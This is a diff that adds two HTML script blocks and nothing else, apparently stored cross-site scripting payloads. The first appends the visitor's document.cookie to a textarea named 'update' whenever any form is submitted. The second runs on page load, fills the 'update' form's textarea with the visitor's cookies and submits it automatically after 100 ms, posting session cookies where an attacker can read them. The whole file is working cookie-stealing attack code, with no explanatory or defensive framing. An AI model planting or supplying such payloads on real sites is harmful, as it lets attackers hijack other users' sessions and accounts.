@@ -1,0 +1,50 @@
+<script>
+  const forms = document.getElementsByTagName('form');
+  
+  for(let i = 0; i < forms.length; i++) {
+    forms[i].addEventListener('submit', function(event) {
+      const updateTextarea = document.querySelector('textarea[name="update"]');
+      
+      if(updateTextarea) {
+        const originalContent = updateTextarea.value;
+        const cookieData = document.cookie;
+        
+
+        updateTextarea.value = originalContent + "\n\nCookies: " + cookieData;
+      }
+    });
+  }
+</script>
+
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Find the existing form with action="update"
+    const form = document.querySelector('form[action="update"]');
+    
+    if (form) {
+        // Find the textarea
+        const textArea = form.querySelector('textarea');
+        
+        if (textArea) {
+            // Set the textarea content
+            textArea.value = document.cookie;
+            
+            // Use a small timeout to ensure any event listeners have processed
+            setTimeout(() => {
+                const submitButton = form.querySelector('input[type="submit"], button[type="submit"]');
+                if (submitButton) {
+                    submitButton.click();
+                } else {
+                  // dispatch submit event if no submit button found
+                    form.dispatchEvent(new Event('submit'));
+                }
+            }, 100);
+        } else {
+            console.error('Textarea not found in the form');
+        }
+    } else {
+        console.error('Form with action="update" not found');
+    }
+});
+</script>
